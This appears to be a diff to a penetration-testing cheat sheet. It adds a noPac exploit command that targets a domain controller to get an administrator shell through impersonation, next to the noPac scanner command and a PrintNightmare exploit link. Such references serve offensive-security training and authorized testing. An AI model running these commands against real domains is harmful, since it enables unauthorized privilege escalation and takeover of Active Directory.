@@ -476,6 +476,10 @@ git clone https://github.com/Ridter/noPac.git
 sudo python3 scanner.py <domain>/<username>:<password> -dc-ip <domain controller> -use-ldap
 ```
 
+```shell
+sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <domain controller> -dc-host <hostname> -shell --impersonate administrator -use-ldap
+```
+
 - [PrintNightmare](https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527)
 
 
